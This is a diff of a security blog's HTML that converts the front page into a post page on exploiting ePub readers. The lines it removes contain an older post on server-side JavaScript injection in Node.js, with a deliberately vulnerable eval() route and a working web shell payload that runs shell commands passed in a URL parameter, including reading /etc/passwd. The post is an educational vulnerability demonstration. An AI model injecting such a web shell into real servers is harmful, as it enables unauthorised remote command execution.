@@ -6,12 +6,11 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
-  <title>Signal Chaos</title>
-  <meta name="description" content="Observations in application security
-">
+  <title>This book reads you - exploiting services and readers that support the ePub book format</title>
+  <meta name="description" content="  “We use the ePub format - it is the most popular open book format in the world. We’re very excited about this.” - Steve Jobs, 2010 (original iPad launch)">
 
   <link rel="stylesheet" href="/css/main.css">
-  <link rel="canonical" href="http://s1gnalcha0s.github.io/">
+  <link rel="canonical" href="http://s1gnalcha0s.github.io/epub/2017/01/25/This-book-reads-you.html">
   <link rel="alternate" type="application/rss+xml" title="Signal Chaos" href="http://s1gnalcha0s.github.io/feed.xml" />
 </head>
 
@@ -55,22 +54,15 @@
 
     <div class="page-content">
       <div class="wrapper">
-        <div class="home">
+        <div class="post">
 
-  <h1 class="page-heading">Posts</h1>
+  <header class="post-header">
+    <h1 class="post-title">This book reads you - exploiting services and readers that support the ePub book format</h1>
+    <p class="post-meta">Jan 25, 2017</p>
+  </header>
 
-  <ul class="post-list">
-    
-      <li>
-        <span class="post-meta">Jan 25, 2017</span>
-
-        <h2>
-          <a class="post-link" href="/epub/2017/01/25/This-book-reads-you.html">This book reads you - exploiting services and readers that support the ePub book format</a>
-        </h2>
-
-<!-- adding all articles to the front page for now. This will need to be changed later. -->
-	<article class="post-content">
-          <blockquote>
+  <article class="post-content">
+    <blockquote>
   <p>“We use the ePub format - it is the most popular open book format in the world. We’re very excited about this.” - Steve Jobs, 2010 (original iPad launch)</p>
 </blockquote>
 
@@ -222,87 +214,25 @@
 
 <p><a href="https://twitter.com/craig_arendt">@craig</a></p>
 
-        </article>
-
-      </li>
-    
-      <li>
-        <span class="post-meta">Jan 31, 2015</span>
-
-        <h2>
-          <a class="post-link" href="/node/2015/01/31/SSJS-webshell-injection.html">SSJS Web Shell Injection</a>
-        </h2>
-
-<!-- adding all articles to the front page for now. This will need to be changed later. -->
-	<article class="post-content">
-          <p>I’ve recently become interested in real world examples of vulnerabilities in Node.js applications, which allow <code>Server Side Javascript Injection</code>. One advisory I came across was <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7205">CVE-2014-7205</a> discovered by Jarda Kotěšovec in a <a href="https://github.com/hapijs/bassmaster/commit/b751602d8cb7194ee62a61e085069679525138c4">Basmaster plugin</a> which allows arbitrary Javascript injection.</p>
-
-<p>I decided to mock up a simple example of user input passed to an eval() execution sink, to demonstrate an injection of a simple web shell into the server. This web shell will only exist within the current node.js process, and will not be written to disk.</p>
-
-<p>This demo application will only allow a single user input selection to keep things simple:
-<img src="/assets/SSJS_ws1.png" alt="Demo app" /></p>
-
-<p>Vulnerable code (user input passed to an eval execution sink):</p>
-
-<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/demo1&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
-  <span class="kd">var</span> <span class="nx">year</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="s2">&quot;year = (&quot;</span> <span class="o">+</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">year</span> <span class="o">+</span> <span class="s2">&quot;)&quot;</span><span class="p">);</span>
-  <span class="kd">var</span> <span class="nx">date</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">();</span>
-
-  <span class="kd">var</span> <span class="nx">futureAge</span> <span class="o">=</span> <span class="mi">2050</span> <span class="o">-</span> <span class="nx">year</span><span class="p">;</span>
-
-  <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;demo1&#39;</span><span class="p">,</span>
-    <span class="p">{</span>
-      <span class="nx">title</span><span class="o">:</span> <span class="s1">&#39;Future Age&#39;</span><span class="p">,</span>
-      <span class="nx">output</span><span class="o">:</span> <span class="nx">futureAge</span>
-    <span class="p">});</span>
-<span class="p">});</span></code></pre></div>
-
-<p>In this example res.write(‘SSJS Injection’) is injected, and the server will return that string in the page response:
-<img src="/assets/SSJS_ws2.png" alt="Demo app" /></p>
-
-<p>So we can perform arbitrary SSJS injection on this location. What about injecting a web shell that will start up after 5 seconds, listening on TCP/8000?</p>
-
-<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
-    <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;http&#39;</span><span class="p">).</span><span class="nx">createServer</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span>
-            <span class="s2">&quot;Content-Type&quot;</span><span class="o">:</span> <span class="s2">&quot;text/plain&quot;</span>
-        <span class="p">});</span>
-        <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">).</span><span class="nx">parse</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">).</span><span class="nx">query</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">],</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">s</span><span class="p">,</span> <span class="nx">st</span><span class="p">)</span> <span class="p">{</span>
-            <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="nx">s</span><span class="p">);</span>
-        <span class="p">});</span>
-    <span class="p">}).</span><span class="nx">listen</span><span class="p">(</span><span class="mi">8000</span><span class="p">);</span>
-<span class="p">},</span> <span class="mi">5000</span><span class="p">)</span></code></pre></div>
-
-<p>One line web shell:</p>
-
-<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;http&#39;</span><span class="p">).</span><span class="nx">createServer</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span> <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span><span class="s2">&quot;Content-Type&quot;</span><span class="o">:</span> <span class="s2">&quot;text/plain&quot;</span><span class="p">});</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">).</span><span class="nx">parse</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">).</span><span class="nx">query</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">],</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span><span class="nx">s</span><span class="p">,</span><span class="nx">st</span><span class="p">)</span> <span class="p">{</span><span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="nx">s</span><span class="p">);});</span> <span class="p">}).</span><span class="nx">listen</span><span class="p">(</span><span class="mi">8000</span><span class="p">);</span> <span class="p">},</span> <span class="mi">5000</span><span class="p">)</span></code></pre></div>
-
-<p>Because we are inserting code which will be eval’d by the application, the web shell will not be written to disk, and execution will be performed from the existing node process. </p>
-
-<p>Injection of the web shell (application continues to respond normally):
-<img src="/assets/SSJS_ws3.png" alt="Demo app" /></p>
-
-<p>Execution of <code>cat /etc/passwd</code> using the web shell:
-<img src="/assets/SSJS_ws4.png" alt="Demo app" /></p>
-
-<p>Execution of <code>ls -la /etc</code>:
-<img src="/assets/SSJS_ws5.png" alt="Demo app" /></p>
-
-<p>This is a really simple example of an application with a SSJS injection vulnerability. Another thing to note is that tools to identify web application vulnerabilities may not have support to detect this vulnerability. At the time of this writing, Burp Suite v1.6.10 did not identify a SSJS injection vulnerability in the demo application.</p>
-
-<ul>
-  <li><code>s1gnalCha0s</code></li>
-</ul>
-
-        </article>
-
-      </li>
-    
-  </ul>
-
-  <p class="rss-subscribe">subscribe <a href="/feed.xml">via RSS</a></p>
+  </article>
 
 </div>
+<!--
+<div id="disqus_thread"></div>
+
+    <script type="text/javascript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 's1gnalcha0s'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments</a></noscript>
+-->
 
       </div>
     </div>
